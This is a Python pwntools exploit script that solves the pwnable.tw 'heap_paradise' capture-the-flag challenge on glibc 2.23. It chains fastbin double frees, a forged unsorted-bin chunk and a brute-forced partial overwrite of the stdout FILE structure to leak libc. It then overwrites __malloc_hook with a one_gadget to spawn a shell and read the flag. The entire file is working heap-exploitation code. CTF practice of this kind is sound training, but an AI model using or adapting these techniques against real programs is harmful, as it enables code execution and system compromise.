#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10308
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./heap_paradise_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # add
            brva 0x0000000000000CF4
            brva 0x0000000000000D66

            # free
            brva 0x0000000000000DCD
            c
            set follow-fork-mode parent
            ''')

def add(size, data = b'abcd'):
    p.sendafter(b'Choice:', str(1))
    p.sendafter(b'Size :', str(size))
    p.sendafter(b'Data :', data)

def free(idx):
    p.sendafter(b'Choice:', str(2))
    p.sendafter(b'Index :', str(idx))

# VARIABLE


# PAYLOAD

while True:
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        p = remote(HOST, PORT)
    else:
        p = exe.process()

    # Make unsorted bin
    add(0x60, p64(0) + p64(0x71)) # 0
    add(0x60) # 1
    free(0)
    free(1)
    free(0)
    add(0x60, b'\x10') # 2
    payload = flat(
        0, 0,
        0, 0,
        0, 0x21,
        0, 0,
        0, 1
        )
    add(0x60, payload) # 3
    add(0x60) # 4
    add(0x60) # 5
    free(0)
    payload = flat(
        0, 0x91
        )
    add(0x60, payload) # 6
    free(5)

    # Leak libc
    free(0)
    free(1)
    free(0)
    add(0x60, b'\x10') # 7
    payload = flat(
        0, 0,
        0, 0,
        0, 0x21,
        )
    add(0x60, payload) # 8
    stdout = p16(libc.sym._IO_2_1_stdout_ - 0x43 & 0xffff)
    add(0x60, p64(0) + p64(0x71) + stdout) # 9
    add(0x60) # 10
    flag = 0xfbad1800
    payload = b'\0'*0x33 + p64(flag) + p64(0)*3 + b'\x88' # \x88 -> stdin

    try:
        add(0x60, payload) # 11
    except EOFError:
        continue
    leak = p.recv(6)
    if leak != b'*'*6:
        libc_leak = u64(leak.ljust(8, b'\0'))
        libc.address = libc_leak - libc.sym._IO_2_1_stdin_
        log.info("Libc base: " + hex(libc.address))
        break
    else:
        p.close()

malloc_hook = libc.sym.__malloc_hook
system = libc.sym.system
gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
# Overwrite __malloc_hook
free(0)
free(1)
free(0)
add(0x60, p64(malloc_hook - 0x23)) # 12
add(0x60) # 13
add(0x60) # 14
add(0x60, b'\0'*0x13 + p64(gadget[2] + libc.address)) # 15

# Trigger abort
free(0)
free(0)
p.sendline(b'cat /home/heap_paradise/flag')

p.interactive()
# 0x777e0